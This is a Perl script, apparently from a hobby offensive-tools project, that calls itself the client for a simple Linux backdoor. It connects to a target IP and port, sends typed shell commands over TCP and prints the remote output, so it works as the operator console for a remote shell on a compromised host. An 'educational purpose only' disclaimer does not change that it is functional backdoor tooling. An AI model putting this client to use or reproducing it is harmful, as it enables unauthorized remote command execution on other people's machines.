#!/bin/perl
# perl version : 5.30
# Description : This is a simple backdoor linux
package CliBack;

use Getopt::Long;
use IO::Socket::INET;

Getopt::Long::Configure('bundling');

my $helpText = "
Description : This is a simple client for backdoor

Usage : \n
--target   | -t\t: target to use
--password | -u\t: password to use
--port     |   \t: port to use (default port of protocol)
--help     | -h\t: print this help
--verbose  | -v\t: print more verbose

(This tool is for educational purpose only)

\n\nExample :

perl CliBack.pl -t 192.168.1.1 --port 34232
";

my $versionText = "
Author \t: \@Exo-poulpe
Version \t: 0.1.0.0

This tool is for educational purpose only, usage of PerlForing for attacking targets without prior mutual consent is illegal.
Developers assume no liability and are not responsible for any misuse or damage cause by this program.

";

my $help;
my $version;
my $verbose;
my $port;
my $password;
my $target;
my $soc;

GetOptions(
    'password|p=s' => \$password,    # string
    'target|t=s'   => \$target,      # string
    'port=i'       => \$port,        # string
    'version'      => \$version,     # flag
    'verbose|v'    => \$verbose,     # flag
    'help|h|?'     => \$help,        # flag
) or die($helpText);

sub main()
{
    if ( defined $help )
    {
        print($helpText);
    }
    elsif ( defined $port )
    {

        # flush after every write
        $| = 1;

        $soc = new IO::Socket::INET(
            PeerHost => $target,
            PeerPort => $port,
            Proto    => 'tcp',
        ) or die "ERROR in Socket Creation : $!\n";

        if ( defined $verbose )
        {
            print "TCP Connection Success.\n";
        }
        my $line;
        my $data;
        while (1)
        {
            print('$');
            $line = <STDIN>;
            if ( defined $verbose ) { print("Debug : $line\n"); }
            $soc->send($line);
            while(($data = <$soc>) ne "{}\n")
            {
                print($data);
            }

            #print($data);
        }
        $soc->close();
    }
    else
    {
        print($helpText);
    }
}

main();
